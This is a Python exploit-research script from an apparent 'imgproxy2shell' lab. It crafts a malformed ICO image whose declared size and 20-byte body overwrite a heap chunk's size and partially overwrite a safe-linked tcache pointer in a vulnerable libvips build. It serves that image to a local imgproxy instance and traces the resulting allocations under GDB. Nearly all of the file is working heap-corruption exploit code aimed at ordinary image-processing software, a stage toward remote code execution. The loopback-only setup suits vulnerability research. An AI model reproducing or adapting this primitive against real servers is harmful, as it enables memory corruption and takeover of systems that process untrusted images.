#!/usr/bin/env python3
"""W9: trace natural malloc(0x20) calls after the W8 wire-only tcache poison.

Loopback only. W7 showed that a short HTTP source stops
`vips_foreign_load_read_full()` after the bytes it has, so the ICO body
length chooses how far the wrapped write reaches. With a groomed 0x20 tcache
victim, the live layout is (base = actual_data - 14):

    base+24..31  victim chunk size (0x35 in the recorded runs)
    base+32..39  victim tcache `next`, safe-linked as ptr ^ (&next >> 12)

A body of exactly 20 bytes writes 10 filler bytes, a preserved little-endian
victim size at body[10:18], and the chosen low 16 bits of `next` at
body[18:20]. The high six bytes and the key are untouched: the wire bytes
retarget the decoded pointer within the same 64 KiB without a leak.

Usage (lab-root paths are pinned in HERE; run from anywhere):
    python3 ico_post_poison_trace.py TAG LOW [N] [PRELOAD] [gdb] [SIZE] [BINARY]

The W8 probe is unchanged except that GDB now prints the post-write wire
decoded head, up to ten subsequent `malloc(0x20)` returns, tcache head/count
after each and the observing thread number. GDB only observes: breakpoints,
`finish` and `continue`, with no memory writes or forced calls.
LOW and SIZE accept Python integer literals. Logs go to $W8_OUTDIR if set,
otherwise beside this script. Ports 18180/18181 are fixed and loopback-only.
"""
import http.client
import http.server
import os
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

SRC_HOST, SRC_PORT = "127.0.0.1", 18181
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18180
HERE = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/imgproxy2shell/provision"
BENIGN = os.path.join(HERE, "ico_benign.ico")
BINARY = os.path.join(HERE, "imgproxy-vuln")
LIBDIR = os.path.abspath(os.path.join(HERE, "..", "..", "libvips2shell",
                                      "build-vuln-plain", "libvips"))

GDB = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND 127.0.0.1:18180
set environment IMGPROXY_BASE_URL http://127.0.0.1:18181/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT rdx=%p\\n", $rdx
set $dst = $rsi
set $base = $dst - 14
printf "GDB_BASE %p ACTUAL %p\\n", $base, $dst
printf "GDB_PRE 12x8 at base-16:\\n"
x/12gx $base-16
finish
printf "GDB_RET=%p\\n", $rax
printf "GDB_POST 12x8 at base-16:\\n"
x/12gx $base-16
printf "GDB_TCACHE_PRE head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
set $pos = $dst + 18
set $raw = *(unsigned long long *)$pos
set $wire = (void *)($raw ^ ((unsigned long)$pos >> 12))
printf "GDB_WIRE_DECODED %p RAW %p POS %p\\n", $wire, $raw, $pos
break malloc if $rdi == 0x20
continue
printf "GDB_M1_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M1_RET %p\\n", $rax
printf "GDB_TCACHE_1 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M2_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M2_RET %p\\n", $rax
printf "GDB_TCACHE_2 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M3_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M3_RET %p\\n", $rax
printf "GDB_TCACHE_3 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M4_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M4_RET %p\\n", $rax
printf "GDB_TCACHE_4 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M5_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M5_RET %p\\n", $rax
printf "GDB_TCACHE_5 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M6_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M6_RET %p\\n", $rax
printf "GDB_TCACHE_6 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M7_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M7_RET %p\\n", $rax
printf "GDB_TCACHE_7 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M8_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M8_RET %p\\n", $rax
printf "GDB_TCACHE_8 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M9_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M9_RET %p\\n", $rax
printf "GDB_TCACHE_9 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
continue
printf "GDB_M10_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M10_RET %p\\n", $rax
printf "GDB_TCACHE_10 head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
quit
"""


def hostile(n, low, size):
    header = b"\x00\x00\x01\x00\x01\x00"
    entry = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22)
    body = bytearray(n)
    body[0:10] = bytes([0x5A, 0x5B, 0x5C, 0x5D] * 2) + bytes([0x5A, 0x5B])
    if n >= 18:
        body[10:18] = struct.pack("<Q", size)
    if n >= 20:
        body[18:20] = struct.pack("<H", low & 0xFFFF)
    return header + entry + bytes(body)


def main():
    tag = sys.argv[1]
    low = int(sys.argv[2], 0)
    n = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    preload = int(sys.argv[4]) if len(sys.argv) > 4 else 2
    use_gdb = len(sys.argv) > 5 and sys.argv[5] == "gdb"
    size = int(sys.argv[6], 0) if len(sys.argv) > 6 else 0x25
    binary = sys.argv[7] if len(sys.argv) > 7 else BINARY
    hostile_ico = hostile(n, low, size)
    with open(BENIGN, "rb") as f:
        benign_ico = f.read()

    class Source(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = hostile_ico if self.path.endswith("hostile.ico") else benign_ico
            self.send_response(200)
            self.send_header("Content-Type", "image/x-icon")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass

    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    outdir = os.environ.get("W8_OUTDIR", HERE)
    os.makedirs(outdir, exist_ok=True)
    logpath = os.path.join(outdir, f"w8-{tag}.log")
    log = open(logpath, "wb")
    env = dict(os.environ)
    env.update({
        "IMGPROXY_BIND": f"{PROXY_HOST}:{PROXY_PORT}",
        "IMGPROXY_BASE_URL": f"http://{SRC_HOST}:{SRC_PORT}/",
        "IMGPROXY_WORKERS": "1", "IMGPROXY_CONCURRENCY": "1",
        "IMGPROXY_LOG_LEVEL": "error", "LD_LIBRARY_PATH": LIBDIR,
        "IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES": "true",
    })
    cmd = None
    if use_gdb:
        fd, cmd = tempfile.mkstemp(prefix=f"w8-{tag}-", suffix=".gdb")
        with os.fdopen(fd, "w") as f:
            f.write(GDB.format(libdir=LIBDIR))
        argv = ["gdb", "-batch", "-x", cmd, binary]
    else:
        argv = [binary]
    proc = subprocess.Popen(argv, env=env, stdout=log, stderr=subprocess.STDOUT)

    def wait_port():
        end = time.monotonic() + 20
        while time.monotonic() < end:
            try:
                with socket.create_connection((PROXY_HOST, PROXY_PORT), 0.2):
                    return True
            except OSError:
                time.sleep(0.1)
        return False

    def get(path):
        conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=8)
        try:
            conn.request("GET", "/insecure/" + path, headers={"Host": PROXY_HOST})
            r = conn.getresponse()
            return r.status, r.read(200)
        finally:
            conn.close()

    try:
        if not wait_port():
            print(f"W8 tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        results = []
        for i in range(preload):
            try:
                st, _ = get("rs:fill:16:16/plain/benign.ico")
                results.append(f"benign[{i}]={st}")
            except Exception as exc:
                results.append(f"benign[{i}]={type(exc).__name__}:{exc}")
        t0 = time.monotonic()
        try:
            st, body = get("rs:fill:16:16/plain/hostile.ico")
            results.append(f"hostile={st}:{body[:100]!r}")
        except Exception as exc:
            results.append(f"hostile={type(exc).__name__}:{exc}")
        elapsed = time.monotonic() - t0
        time.sleep(0.3)
        print(f"W8 tag={tag} n={n} low=0x{low:04x} size=0x{size:x} "
              f"preload={preload} gdb={use_gdb} elapsed={elapsed:.3f} "
              f"rc={proc.poll()} " + " ".join(results), flush=True)
    finally:
        try:
            proc.wait(timeout=35 if use_gdb else 5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=5)
        log.flush()
        log.close()
        srv.shutdown()
        srv.server_close()
        if cmd:
            os.unlink(cmd)
        with open(logpath, "rb") as f:
            out = f.read().decode("utf-8", "replace")
        for line in out.splitlines():
            if line.startswith(("GDB_", "0x7f", "malloc():", "free():",
                                "tcache", "corrupted")):
                print(f"W8LOG tag={tag} {line[:300]}", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
